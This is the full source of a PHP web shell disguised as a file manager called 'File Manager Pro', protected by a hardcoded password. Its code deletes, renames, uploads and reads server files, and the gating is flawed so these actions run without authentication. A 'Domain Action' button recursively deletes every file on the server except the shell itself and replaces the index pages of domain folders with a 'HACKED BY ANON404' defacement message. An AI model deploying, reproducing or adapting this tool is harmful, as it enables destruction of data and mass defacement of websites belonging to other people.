<?php
error_reporting(0);
ini_set('display_errors', 0);
session_start();

if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

$pw = 'maklo';
if (isset($_POST['password']) && $_POST['password'] === $pw) {
    $_SESSION['auth'] = true;
}

$path = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();

if (isset($_GET['del'])) {
    $delPath = realpath($_GET['del']);
    function deleteRecursive($path) {
        if (is_file($path)) {
            unlink($path);
        } elseif (is_dir($path)) {
            $items = scandir($path);
            foreach ($items as $item) {
                if ($item === '.' || $item === '..') continue;
                deleteRecursive($path . DIRECTORY_SEPARATOR . $item);
            }
            rmdir($path);
        }
    }
    if (file_exists($delPath)) {
        deleteRecursive($delPath);
    }
    header("Location: ?path=" . urlencode(dirname($delPath)));
    exit;
}

if (isset($_POST['rename_from'], $_POST['rename_to'])) {
    $from = realpath($_POST['rename_from']);
    $to = dirname($from) . DIRECTORY_SEPARATOR . basename($_POST['rename_to']);
    if ($from && $to && file_exists($from)) {
        rename($from, $to);
    }
    header("Location: ?path=" . urlencode(dirname($from)));
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $uploadPath = realpath($_POST['upload_path']);
    if (is_dir($uploadPath)) {
        $fileName = basename($_FILES['file']['name']);
        move_uploaded_file($_FILES['file']['tmp_name'], $uploadPath . DIRECTORY_SEPARATOR . $fileName);
        
        if (isDomainFolder(basename($uploadPath))) {
            createIndexFile($uploadPath);
        }
    }
    header("Location: ?path=" . urlencode($uploadPath));
    exit;
}

if (isset($_POST['new_name'], $_POST['new_type'])) {
    $newPath = $path . DIRECTORY_SEPARATOR . basename($_POST['new_name']);
    if ($_POST['new_type'] === 'file') {
        file_put_contents($newPath, '');
    } else {
        mkdir($newPath);
        if (isDomainFolder($_POST['new_name'])) {
            createIndexFile($newPath);
        }
    }
    header("Location: ?path=" . urlencode($path));
    exit;
}

function recursiveAction($dir) {
    $processedDomains = [];
    
    $items = scandir($dir);
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $fullPath = $dir . DIRECTORY_SEPARATOR . $item;

        if (is_dir($fullPath)) {
            if (isDomainFolder($item)) {
                file_put_contents($fullPath . DIRECTORY_SEPARATOR . 'index.html', 'HACKED BY ANON404 DARI TEAM, TRASER SEC TEAM TANGERANG BLACK HAT');
                $processedDomains[] = $item;
            }
            $subDomains = recursiveAction($fullPath);
            $processedDomains = array_merge($processedDomains, $subDomains);
        } else {
            if (basename($fullPath) !== basename(__FILE__)) {
                unlink($fullPath);
            }
        }
    }
    
    return $processedDomains;
}

if (isset($_POST['trigger_action'])) {
    $processedDomains = recursiveAction(getcwd());
    $totalCount = count($processedDomains);
    
    if ($totalCount > 0) {
        $successMessage = "Success: " . implode(', ', $processedDomains) . " | Total: " . $totalCount . " domains";
    } else {
        $successMessage = "No domain folders found";
    }
    
    $_SESSION['success_message'] = $successMessage;
    header("Location: ?path=" . urlencode($path));
    exit;
}

if (isset($_POST['delete_filename'])) {
    $filename = $_POST['delete_filename'];
    deleteFileRecursive(getcwd(), $filename);
    header("Location: ?path=" . urlencode($path));
    exit;
}

function isDomainFolder($name) {
    $extensions = 'com|org|net|edu|gov|mil|int|co|uk|us|de|fr|it|es|nl|au|ca|jp|cn|ru|br|in|kr|mx|ar|cl|pe|ve|bo|ec|py|uy|sr|gf|gy|fk|id|my|sg|th|vn|ph|la|kh|mm|bn|bt|np|lk|mv|af|pk|bd|ir|iq|il|jo|lb|sy|tr|ae|sa|kw|bh|qa|om|ye|az|am|ge|by|ua|md|ro|bg|hr|si|sk|cz|pl|hu|ee|lv|lt|fi|se|no|dk|is|ie|gb|mt|cy|gr|al|mk|me|rs|ba|xk|ad|sm|va|mc|li|lu|be|ch|at|pt|es|fr|it|de|nl|se|no|dk|fi|is|ie|gb|pl|cz|sk|hu|ro|bg|hr|si|ee|lv|lt|by|ua|ru|ge|am|az|tr|cy|mt|gr|al|mk|me|rs|ba|ad|sm|va|mc|li|lu|be|ch|at|za|ng|eg|ma|dz|tn|ly|sd|et|ke|tz|ug|rw|bi|mw|zm|zw|bw|sz|ls|na|ao|cm|cf|td|ne|ml|bf|gm|sn|gw|gn|sl|lr|ci|gh|tg|bj|mr|cv|st|km|sc|mu|mg|re|yt|mz|za|bh|qa|om|ae|kw|sa|ye|iq|ir|af|pk|in|bt|np|bd|lk|mv|mm|th|la|kh|vn|my|sg|bn|ph|id|tl|au|nz|pg|sb|vu|nc|pf|wf|fm|pw|mh|ki|nr|tv|to|ws|as|gu|mp|vi|pr|ag|ai|aw|bb|bz|bs|cu|dm|do|gd|gt|ht|hn|jm|kn|ky|lc|ms|ni|pa|kn|lc|pm|vc|tt|tc|vg|vi|ca|us|mx|bz|gt|sv|hn|ni|cr|pa|co|ve|gy|sr|br|ec|pe|bo|py|cl|ar|uy|fk|gf|gl|pm|re|yt|tf|aq|bv|gs|hm|io|cc|cx|cw|sx|bq|ai|aw|bm|vg|ky|ms|tc|pr|vi|as|gu|mp|pw|mh|fm|ki|nr|nu|tk|tv|to|ws|ck|fj|pg|sb|vu|nc|pf|wf|xyz|top|site|online|store|tech|info|biz|name|mobi|aero|asia|cat|coop|edu|gov|int|jobs|mil|museum|post|tel|travel|xxx|pro|arpa|test|localhost|local|example|invalid|academy|accountant|accountants|actor|adult|agency|airforce|apartments|app|army|art|attorney|auction|audio|auto|autos|baby|band|bank|bar|bargains|basketball|beauty|beer|best|bet|bible|bid|bike|bingo|bio|black|blackfriday|blog|blue|boats|bond|boo|book|boston|boutique|box|broadway|broker|brussels|build|builders|business|buy|buzz|cab|cafe|cam|camera|camp|capital|car|cards|care|career|careers|cars|casa|case|cash|casino|catering|catholic|center|ceo|cfd|charity|chat|cheap|christmas|church|city|claims|cleaning|click|clinic|clothing|cloud|club|coach|codes|coffee|college|cologne|community|company|computer|condos|construction|consulting|contact|contractors|cooking|cool|coop|country|coupon|coupons|courses|credit|creditcard|cricket|cruises|dance|data|date|dating|day|deal|deals|degree|delivery|democrat|dental|dentist|design|dev|diamonds|diet|digital|direct|directory|discount|doctor|dog|domains|download|drive|earth|eat|eco|education|email|energy|engineer|engineering|enterprises|equipment|estate|events|exchange|expert|exposed|express|fail|faith|family|fan|fans|farm|fashion|fast|feedback|film|finance|financial|fire|fish|fishing|fit|fitness|flights|florist|flowers|fly|foo|food|football|forex|forsale|forum|foundation|free|fund|furniture|futbol|fyi|gallery|game|games|garden|gay|gift|gifts|gives|giving|glass|global|gmbh|gold|golf|graphics|gratis|green|gripe|group|guide|guitars|guru|hair|hamburg|health|healthcare|help|here|hiphop|history|hockey|holdings|holiday|home|horse|hospital|host|hosting|hotel|house|how|ice|immobilien|immo|inc|industries|ink|institute|insurance|insure|international|investments|jewelry|jobs|juegos|kaufen|kim|kitchen|land|lawyer|lease|legal|lgbt|life|lighting|limited|limo|link|live|loan|loans|lol|london|love|ltd|luxury|maison|makeup|management|market|marketing|markets|mba|media|meet|meme|memorial|men|menu|miami|mobi|moda|money|mortgage|mov|movie|music|navy|network|new|news|ninja|now|nyc|one|online|ooo|organic|page|parts|party|pay|payment|pet|pets|pharmacy|photo|photography|photos|pics|pictures|pink|pizza|place|plumbing|plus|poker|porn|press|pro|productions|promo|properties|property|pub|racing|radio|realestate|recipes|red|rehab|rent|rentals|repair|report|republican|rest|restaurant|review|reviews|rich|rip|rocks|rodeo|run|sale|salon|save|scholarships|school|science|search|security|select|services|sex|sexy|shiksha|shoes|shop|shopping|show|singles|site|ski|skin|soccer|social|software|solar|solutions|space|sport|sports|spot|store|stream|studio|study|style|sucks|supplies|supply|support|surf|surgery|systems|tax|taxi|team|tech|technology|tennis|theater|theatre|tickets|tips|tires|today|tools|top|tours|town|toys|trade|training|travel|tube|tv|university|uno|vacations|vegas|ventures|vet|video|villas|vision|vodka|vote|voting|voyage|watch|water|weather|web|webcam|website|wedding|whoswho|wiki|win|wine|work|works|world|wtf|xxx|yoga|zone|aaa|aarp|abbott|able|abogado|about|abudhabi|academy|accenture|accountant|accountants|active|actor|ads|adult|aeg|aero|afl|africa|agency|aig|airforce|airtel|aiva|akdn|alibaba|alipay|allfinanz|allstate|ally|alsace|amazon|amica|amsterdam|analytics|android|anquan|apartments|app|apple|aquarelle|arab|aramco|archi|army|art|arte|asda|asia|associates|attorney|auction|audi|audible|audio|auspost|author|auto|autos|avianca|aws|axa|azure|baby|baidu|banamex|bananarepublic|band|bank|bar|barcelona|barclaycard|barclays|barefoot|bargains|baseball|basketball|bauhaus|bayern|bbc|bbt|bbva|bcg|bcn|beats|beauty|beer|bentley|berlin|best|bestbuy|bet|bharti|bible|bid|bike|bing|bingo|bio|black|blackfriday|blockbuster|blog|bloomberg|blue|bms|bmw|bnpparibas|boats|boehringer|bofa|bom|bond|boo|book|booking|bosch|bostik|boston|bot|boutique|box|bradesco|bridgestone|broadway|broker|brother|brussels|build|builders|business|buy|buzz|bzh|cab|cafe|cal|call|calvinklein|cam|camera|camp|canon|capetown|capital|capitalone|car|caravan|cards|care|career|careers|cars|casa|case|cash|casino|cat|catering|catholic|cba|cbn|cbre|cbs|center|ceo|cern|cfa|cfd|chanel|channel|charity|chase|chat|cheap|chintai|christmas|chrome|church|cipriani|circle|cisco|citadel|citi|citic|city|claims|cleaning|click|clinic|clinique|clothing|cloud|club|clubmed|coach|codes|coffee|college|cologne|com|comcast|commbank|community|company|compare|computer|comsec|condos|construction|consulting|contact|contractors|cooking|cool|coop|corsica|country|coupon|coupons|courses|cpa|credit|creditcard|creditunion|cricket|crown|crs|cruise|cruises|cuisinella|cymru|cyou|dabur|dad|dance|data|date|dating|datsun|day|dclk|dds|deal|dealer|deals|degree|delivery|dell|deloitte|delta|democrat|dental|dentist|desi|design|dev|dhl|diamonds|diet|digital|direct|directory|discount|discover|dish|diy|dnp|docs|doctor|dog|domains|dot|download|drive|dtv|dubai|dunlop|dupont|durban|dvag|dvr|earth|eat|eco|edeka|edu|education|email|emerck|energy|engineer|engineering|enterprises|epson|equipment|ericsson|erni|esq|estate|eurovision|eus|events|exchange|expert|exposed|express|extraspace|fage|fail|fairwinds|faith|family|fan|fans|farm|farmers|fashion|fast|fedex|feedback|ferrari|ferrero|fidelity|fido|film|final|finance|financial|fire|firestone|firmdale|fish|fishing|fit|fitness|flickr|flights|flir|florist|flowers|fly|foo|food|foodnetwork|football|ford|forex|forsale|forum|foundation|fox|free|fresenius|frl|frogans|frontdoor|frontier|ftr|fujitsu|fun|fund|furniture|futbol|fyi|gal|gallery|gallo|gallup|game|games|gap|garden|gay|gbiz|gdn|gea|gent|genting|george|ggee|gift|gifts|gives|giving|glass|gle|global|globo|gmail|gmbh|gmo|gmx|godaddy|gold|goldpoint|golf|goo|goodyear|goog|google|gop|got|gov|grainger|graphics|gratis|green|gripe|grocery|group|guardian|gucci|guge|guide|guitars|guru|hair|hamburg|hangout|haus|hbo|hdfc|hdfcbank|health|healthcare|help|helsinki|here|hermes|hgtv|hiphop|hisamitsu|hitachi|hiv|hkt|hockey|holdings|holiday|homedepot|homegoods|homes|homesense|honda|horse|hospital|host|hosting|hot|hoteles|hotels|hotmail|house|how|hsbc|hughes|hyatt|hyundai|ibm|icbc|ice|icu|ieee|ifm|ikano|imamat|imdb|immo|immobilien|inc|industries|infiniti|info|ing|ink|institute|insurance|insure|intel|international|intuit|investments|ipiranga|irish|ismaili|ist|istanbul|itau|itv|jaguar|java|jcb|jeep|jetzt|jewelry|jio|jll|jmp|jnj|jobs|joburg|jot|joy|jpmorgan|jprs|juegos|juniper|kaufen|kddi|kerryhotels|kerrylogistics|kerryproperties|kfh|kia|kids|kim|kinder|kindle|kitchen|kiwi|koeln|komatsu|kosher|kpmg|kpn|krd|kred|kuokgroup|kyoto|lacaixa|lamborghini|lamer|lancaster|land|landrover|lanxess|lasalle|lat|latino|latrobe|law|lawyer|lds|lease|leclerc|lefrak|legal|lego|lexus|lgbt|lidl|life|lifeinsurance|lifestyle|lighting|like|lilly|limited|limo|lincoln|link|lipsy|live|living|llc|llp|loan|loans|locker|locus|lol|london|lotte|lotto|love|lpl|lplfinancial|ltd|ltda|lundbeck|luxe|luxury|macys|madrid|maif|maison|makeup|man|management|mango|map|market|marketing|markets|marriott|marshalls|mattel|mba|mckinsey|med|media|meet|melbourne|meme|memorial|men|menu|merckmsd|miami|microsoft|mini|mint|mit|mitsubishi|mlb|mls|mma|mobi|mobile|moda|moe|moi|mom|monash|money|monster|mormon|mortgage|moscow|moto|mov|movie|msd|mtn|mtr|music|nab|nagoya|navy|nba|nec|net|netbank|netflix|network|neustar|new|news|next|nextdirect|nexus|nfl|ngo|nhk|nico|nike|nikon|ninja|nissan|nissay|nokia|norton|now|nowruz|nowtv|nra|nrw|ntt|nyc|obi|observer|office|okinawa|olayan|olayangroup|oldnavy|ollo|omega|one|ong|onl|online|ooo|open|oracle|orange|org|organic|origins|osaka|otsuka|ott|ovh|page|panasonic|paris|pars|partners|parts|party|pay|pccw|pet|pets|pfizer|pharmacy|phd|philips|phone|photo|photography|photos|physio|pics|pictet|pictures|pid|pin|ping|pink|pioneer|pizza|place|play|playstation|plumbing|plus|pnc|pohl|poker|politie|porn|pramerica|praxi|press|prime|pro|prod|productions|prof|progressive|promo|properties|property|protection|pru|prudential|pub|pwc|qpon|quebec|quest|racing|radio|read|realestate|realtor|realty|recipes|red|redstone|redumbrella|rehab|reise|reisen|reit|reliance|ren|rent|rentals|repair|report|republican|rest|restaurant|review|reviews|rexroth|rich|richardli|ricoh|ril|rio|rip|rocks|rodeo|rogers|room|rsvp|rugby|ruhr|run|rwe|ryukyu|saarland|safe|safety|sakura|sale|salon|samsclub|samsung|sandvik|sandvikcoromant|sanofi|sap|sarl|sas|save|saxo|sbi|sbs|sca|scb|schaeffler|schmidt|scholarships|school|schule|schwarz|science|scranton|search|seat|secure|security|seek|select|sener|services|seven|sew|sex|sexy|sfr|shangrila|sharp|shaw|shell|shia|shiksha|shoes|shop|shopping|shouji|show|showtime|silk|sina|singles|site|ski|skin|sky|skype|sling|smart|smile|sncf|soccer|social|softbank|software|sohu|solar|solutions|song|sony|soy|spa|space|sport|spot|srl|stada|staples|star|statebank|statefarm|stc|stcgroup|stockholm|storage|store|stream|studio|study|style|sucks|supplies|supply|support|surf|surgery|suzuki|swatch|swiss|sydney|systems|tab|taipei|talk|taobao|target|tatamotors|tatar|tattoo|tax|taxi|tci|tdk|team|tech|technology|tel|temasek|tennis|teva|thd|theater|theatre|tiaa|tickets|tienda|tips|tires|tirol|tjmaxx|tjx|tkmaxx|tmall|today|tokyo|tools|top|toray|toshiba|total|tours|town|toyota|toys|trade|trading|training|travel|travelers|travelersinsurance|trust|trv|tube|tui|tunes|tushu|tvs|ubank|ubs|unicom|university|uno|uol|ups|vacations|vana|vanguard|vegas|ventures|verisign|versicherung|vet|viajes|video|vig|viking|villas|vin|vip|virgin|visa|vision|viva|vivo|vlaanderen|vodka|volvo|vote|voting|voto|voyage|wales|walmart|walter|wang|wanggou|watch|watches|weather|weatherchannel|webcam|weber|website|wedding|weibo|weir|whoswho|wien|wiki|williamhill|win|windows|wine|winners|wme|wolterskluwer|woodside|work|works|world|wow|wtc|wtf|xbox|xerox|xihuan|xin|xxx|xyz|yachts|yahoo|yamaxun|yandex|ye|yodobashi|yoga|yokohama|you|youtube|yun|zappos|zara|zero|zip|zone|zuerich';
    return preg_match('/^[a-z0-9.-]+\.(' . $extensions . ')$/i', $name);
}

function deleteFileRecursive($dir, $filename) {
    $items = scandir($dir);
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $fullPath = $dir . DIRECTORY_SEPARATOR . $item;
        
        if (is_dir($fullPath)) {
            deleteFileRecursive($fullPath, $filename);
        } elseif ($item === $filename && basename(__FILE__) !== $filename) {
            unlink($fullPath);
        }
    }
}

function copyDomainList() {
    $domains = [];
    $dir = getcwd();
    $items = scandir($dir);
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $fullPath = $dir . DIRECTORY_SEPARATOR . $item;
        if (is_dir($fullPath) && isDomainFolder($item)) {
            $domains[] = $item;
        }
    }
    return $domains;
}

$files = scandir($path);
$parent = dirname($path);

if (isset($_GET['preview'])) {
    $file = $_GET['preview'];
    if (is_file($file)) {
        header('Content-Type: text/plain');
        echo file_get_contents($file);
        exit;
    } else {
        http_response_code(404);
        echo "File not found.";
        exit;
    }
}

$auth = !empty($_SESSION['auth']);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Manager Pro</title>
    <script src="https://unpkg.com/lucide@latest/dist/umd/lucide.js"></script>
    <style>
        :root {
            --bg-primary: #0a0e17;
            --bg-secondary: #1a1f2e;
            --bg-tertiary: #242938;
            --accent-blue: #3b82f6;
            --accent-purple: #8b5cf6;
            --text-primary: #ffffff;
            --text-secondary: #94a3b8;
            --border: #334155;
            --success: #10b981;
            --danger: #ef4444;
            --warning: #f59e0b;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Inter', system-ui, sans-serif;
            background: linear-gradient(135deg, var(--bg-primary) 0%, #0f172a 100%);
            color: var(--text-primary);
            min-height: 100vh;
            line-height: 1.6;
        }

        .auth-container {
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
        }

        .auth-card {
            background: var(--bg-secondary);
            padding: 48px;
            border-radius: 20px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
            border: 1px solid var(--border);
            width: 100%;
            max-width: 420px;
            text-align: center;
        }

        .auth-card h1 {
            background: linear-gradient(135deg, var(--accent-blue), var(--accent-purple));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 32px;
            font-size: 2.25rem;
            font-weight: 800;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
        }

        .form-input {
            width: 100%;
            padding: 16px 20px;
            background: var(--bg-tertiary);
            border: 2px solid transparent;
            border-radius: 12px;
            color: var(--text-primary);
            font-size: 16px;
            transition: all 0.3s ease;
            margin-bottom: 24px;
        }

        .form-input:focus {
            outline: none;
            border-color: var(--accent-blue);
            box-shadow: 0 0 0 4px rgba(59, 130, 246, 0.1);
        }

        .btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            padding: 16px 32px;
            background: linear-gradient(135deg, var(--accent-blue), var(--accent-purple));
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            text-decoration: none;
            min-height: 56px;
            width: 100%;
        }

        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 20px 25px -5px rgba(59, 130, 246, 0.4);
        }

        .btn-danger {
            background: linear-gradient(135deg, var(--danger), #dc2626);
        }

        .btn-success {
            background: linear-gradient(135deg, var(--success), #059669);
        }

        .btn-warning {
            background: linear-gradient(135deg, var(--warning), #d97706);
        }

        .btn-sm {
            padding: 10px 16px;
            font-size: 14px;
            min-height: 40px;
            width: auto;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 24px;
        }

        .header {
            background: var(--bg-secondary);
            padding: 24px 32px;
            margin-bottom: 32px;
            border-radius: 16px;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.3);
            border: 1px solid var(--border);
        }

        .header-content {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 20px;
        }

        .header h1 {
            background: linear-gradient(135deg, var(--accent-blue), var(--accent-purple));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-size: 2rem;
            font-weight: 800;
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .breadcrumb {
            display: flex;
            align-items: center;
            gap: 8px;
            margin: 24px 0;
            padding: 16px 20px;
            background: var(--bg-tertiary);
            border-radius: 12px;
            font-size: 14px;
            color: var(--text-secondary);
            border: 1px solid var(--border);
        }

        .actions-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
            gap: 24px;
            margin-bottom: 32px;
        }

        .action-card {
            background: var(--bg-secondary);
            padding: 24px;
            border-radius: 16px;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.3);
            border: 1px solid var(--border);
            transition: transform 0.2s ease;
        }

        .action-card:hover {
            transform: translateY(-2px);
        }

        .action-card h3 {
            margin-bottom: 16px;
            color: var(--text-primary);
            font-size: 1.2rem;
            font-weight: 600;
        }

        .upload-area {
            border: 2px dashed var(--border);
            border-radius: 12px;
            padding: 32px;
            text-align: center;
            transition: all 0.3s ease;
            cursor: pointer;
            margin-bottom: 20px;
        }

        .upload-area:hover {
            border-color: var(--accent-blue);
            background: rgba(59, 130, 246, 0.05);
        }

        .file-grid {
            display: grid;
            gap: 12px;
        }

        .file-item {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 20px;
            background: var(--bg-secondary);
            border: 1px solid var(--border);
            border-radius: 12px;
            transition: all 0.3s ease;
        }

        .file-item:hover {
            background: var(--bg-tertiary);
            transform: translateY(-1px);
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.3);
        }

        .file-info {
            display: flex;
            align-items: center;
            gap: 16px;
            flex: 1;
            min-width: 0;
        }

        .file-icon {
            width: 24px;
            height: 24px;
            flex-shrink: 0;
            color: var(--accent-blue);
        }

        .file-name {
            color: var(--text-primary);
            text-decoration: none;
            font-weight: 500;
            word-break: break-all;
        }

        .file-name:hover {
            color: var(--accent-blue);
        }

        .file-actions {
            display: flex;
            gap: 12px;
            flex-shrink: 0;
        }

        .file-actions a {
            color: var(--text-secondary);
            padding: 8px;
            border-radius: 8px;
            transition: all 0.3s ease;
        }

        .file-actions a:hover {
            color: var(--accent-blue);
            background: rgba(59, 130, 246, 0.1);
        }

        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            z-index: 1000;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .modal.show {
            display: flex;
        }

        .modal-content {
            background: var(--bg-secondary);
            border-radius: 16px;
            padding: 32px;
            max-width: 90vw;
            max-height: 90vh;
            overflow: auto;
            border: 1px solid var(--border);
        }

        .domain-folder {
            border-left: 4px solid var(--warning);
        }

        @media (max-width: 768px) {
            .container {
                padding: 16px;
            }
            
            .actions-grid {
                grid-template-columns: 1fr;
            }
            
            .file-item {
                flex-direction: column;
                align-items: flex-start;
                gap: 12px;
            }
            
            .file-actions {
                width: 100%;
                justify-content: flex-end;
            }
        }
    </style>
</head>
<body>
    <?php if (!$auth): ?>
        <div class="auth-container">
            <div class="auth-card">
                <h1>
                    <i data-lucide="shield-check"></i>
                    Secure Access
                </h1>
                <form method="post">
                    <input type="password" name="password" class="form-input" placeholder="Enter password" required>
                    <button class="btn" type="submit">
                        <i data-lucide="log-in"></i>
                        Login
                    </button>
                </form>
            </div>
        </div>
    <?php else: ?>
        <div class="container">
            <div class="header">
                <div class="header-content">
                    <h1>
                        <i data-lucide="folder-open"></i>
                        File Manager Pro
                    </h1>
                    <a href="?logout=1" class="btn btn-danger btn-sm">
                        <i data-lucide="log-out"></i>
                        Logout
                    </a>
                </div>
            </div>

            <div class="breadcrumb">
                <i data-lucide="map-pin"></i>
                <span>Current Path:</span>
                <code><?= htmlentities($path) ?></code>
            </div>

            <?php if (isset($_SESSION['success_message'])): ?>
                <div class="success-message" style="background: var(--success); color: white; padding: 16px 20px; border-radius: 12px; margin-bottom: 24px; font-weight: 500;">
                    <i data-lucide="check-circle" style="width: 20px; height: 20px; margin-right: 8px; display: inline-block;"></i>
                    <?= htmlentities($_SESSION['success_message']) ?>
                </div>
                <?php unset($_SESSION['success_message']); ?>
            <?php endif; ?>

            <div class="actions-grid">
                <div class="action-card">
                    <h3>Domain Operations</h3>
                    <form method="post" style="margin-bottom: 16px;">
                        <button class="btn btn-warning" name="trigger_action" type="submit">
                            <i data-lucide="zap"></i>
                            Execute Domain Action
                        </button>
                    </form>
                    <form method="post">
                        <input type="text" name="delete_filename" class="form-input" placeholder="Filename to delete (e.g., index.php)" required>
                        <button class="btn btn-danger" type="submit">
                            <i data-lucide="trash-2"></i>
                            Mass Delete Files
                        </button>
                    </form>
                    <button class="btn btn-success" type="button" onclick="copyDomainList()">
                        <i data-lucide="copy"></i>
                        Copy Domain List
                    </button>
                </div>

                <div class="action-card">
                    <h3>File Upload</h3>
                    <form method="post" enctype="multipart/form-data">
                        <input type="hidden" name="upload_path" value="<?= htmlentities($path) ?>">
                        <div class="upload-area" onclick="document.getElementById('fileInput').click()">
                            <i data-lucide="upload" style="width: 48px; height: 48px; margin-bottom: 16px; color: var(--accent-blue);"></i>
                            <p>Click to upload files</p>
                        </div>
                        <input type="file" name="file" id="fileInput" style="display: none;" required onchange="this.form.submit()">
                    </form>
                </div>

                <div class="action-card">
                    <h3>Create New</h3>
                    <form method="post">
                        <input type="text" name="new_name" class="form-input" placeholder="Name" required>
                        <select name="new_type" class="form-input">
                            <option value="file">File</option>
                            <option value="folder">Folder</option>
                        </select>
                        <button class="btn" type="submit">
                            <i data-lucide="plus"></i>
                            Create
                        </button>
                    </form>
                </div>
            </div>

            <div class="file-grid">
                <?php if ($path !== getcwd()): ?>
                    <div class="file-item">
                        <div class="file-info">
                            <i data-lucide="arrow-left" class="file-icon"></i>
                            <a href="?path=<?= urlencode($parent) ?>" class="file-name">Back to Parent</a>
                        </div>
                    </div>
                <?php endif; ?>

                <?php foreach ($files as $file): ?>
                    <?php 
                    if ($file === '.') continue;
                    $fullPath = $path . DIRECTORY_SEPARATOR . $file;
                    $url = urlencode($fullPath);
                    $isDomain = is_dir($fullPath) && isDomainFolder($file);
                    ?>
                    <div class="file-item <?= $isDomain ? 'domain-folder' : '' ?>">
                        <div class="file-info">
                            <?php if (is_dir($fullPath)): ?>
                                <i data-lucide="folder" class="file-icon"></i>
                                <a href="?path=<?= $url ?>" class="file-name"><?= htmlentities($file) ?></a>
                            <?php else: ?>
                                <i data-lucide="file-text" class="file-icon"></i>
                                <a href="<?= $url ?>" download class="file-name"><?= htmlentities($file) ?></a>
                            <?php endif; ?>
                        </div>
                        <div class="file-actions">
                            <?php if (is_file($fullPath) && preg_match('/\.(txt|php|html|js|json|md|log)$/i', $file)): ?>
                                <a href="javascript:void(0)" onclick="previewFile('<?= htmlentities($fullPath) ?>')" title="Preview">
                                    <i data-lucide="eye"></i>
                                </a>
                            <?php endif; ?>
                            <a href="?del=<?= $url ?>" onclick="return confirm('Delete this item?')" title="Delete">
                                <i data-lucide="trash-2"></i>
                            </a>
                        </div>
                    </div>
                <?php endforeach; ?>
            </div>
        </div>

        <div id="previewModal" class="modal">
            <div class="modal-content">
                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
                    <h3>File Preview</h3>
                    <button onclick="closeModal()" class="btn btn-sm">
                        <i data-lucide="x"></i>
                        Close
                    </button>
                </div>
                <pre id="previewContent" style="white-space: pre-wrap; background: var(--bg-tertiary); padding: 20px; border-radius: 8px; overflow: auto; max-height: 60vh;"></pre>
            </div>
        </div>

        <textarea id="domainList" style="position: absolute; left: -9999px; opacity: 0;"></textarea>
    <?php endif; ?>

    <script>
        lucide.createIcons();

        async function previewFile(path) {
            try {
                const res = await fetch('?preview=' + encodeURIComponent(path));
                const content = await res.text();
                document.getElementById('previewContent').textContent = content;
                document.getElementById('previewModal').classList.add('show');
            } catch (error) {
                alert('Error loading file preview');
            }
        }

        function closeModal() {
            document.getElementById('previewModal').classList.remove('show');
        }

        function copyDomainList() {
            const domains = <?= json_encode(array_filter($files, function($file) use ($path) {
                $fullPath = $path . DIRECTORY_SEPARATOR . $file;
                return $file !== '.' && $file !== '..' && is_dir($fullPath) && isDomainFolder($file);
            })) ?>;
            
            const textarea = document.getElementById('domainList');
            textarea.value = domains.join('\n');
            textarea.select();
            document.execCommand('copy');
            
            alert('Domain list copied to clipboard!');
        }

        const previewModal = document.getElementById('previewModal');
        if (previewModal) {
            previewModal.addEventListener('click', function(e) {
                if (e.target === this) {
                    closeModal();
                }
            });
        }
    </script>
</body>
</html>